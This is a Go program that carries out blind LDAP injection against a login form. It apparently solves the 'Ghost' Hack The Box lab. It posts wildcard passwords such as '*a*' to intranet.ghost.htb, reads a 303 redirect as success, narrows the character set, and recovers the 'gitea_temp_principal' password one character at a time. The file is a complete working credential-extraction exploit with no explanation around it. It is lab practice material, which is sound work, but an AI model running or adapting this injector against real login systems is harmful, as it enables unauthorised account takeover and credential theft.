package main

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

// Create ldap-injector opbject
type LdapInjector struct {
	Url string
	Username string
	Charset string
}

// Initialize ldap-injector properties
func NewLdapInjector(url, username string) *LdapInjector {
	return &LdapInjector{
		Url: url,
		Username: username,
		Charset: CreateCharset(),
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// ghost.htb is a Next.js app, so we need to set this next action token.
	// Future improvement: visit the page to get this token first so it's not hardcoded.
	req.Header.Set("Next-Action", "c471eb076ccac91d6f828b671795550fd5925940")

	// Do not follow redirects
	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == 303, nil
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		if ok, err := li.TestPassword(fmt.Sprintf("%s%s", prefix, string(c))); err != nil {
			return "", err
		} else if ok {
			fmt.Print(string(c))
			return string(c), nil
		}
	}

	return "", nil
}

func (li *LdapInjector) Brute() (string, error) {
	var result string
	for {
		c, err := li.TestCharacter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			if ok, err := li.TestPassword(result); err != nil {
				return "", err
			} else if !ok {
				return "", fmt.Errorf("partial password found: %s", result)
			}
			break
		}
		result += c
	}
	return result, nil
}

func CreateCharset () string {
	var charset string
	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}
	for i:= range 10 {
		c := strconv.Itoa(i)
		charset += string(c)
	}
	return charset
}

func (li *LdapInjector) PruneCharset() (error) {
	var newCharset string
	for _, char := range li.Charset {
		if ok, err := li.TestPassword(fmt.Sprintf("*%s*", string(char))); err != nil {
			return err
		} else if ok {
			newCharset += string(char)
		}
	}
	li.Charset = newCharset
	return nil
}

func main () {
	c := NewLdapInjector("http://intranet.ghost.htb:8008/login", "gitea_temp_principal")
	fmt.Println("Charset:", c.Charset)
	c.PruneCharset()
	fmt.Println("Pruned Charset:", c.Charset)
	password, err := c.Brute()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Password:", password)
}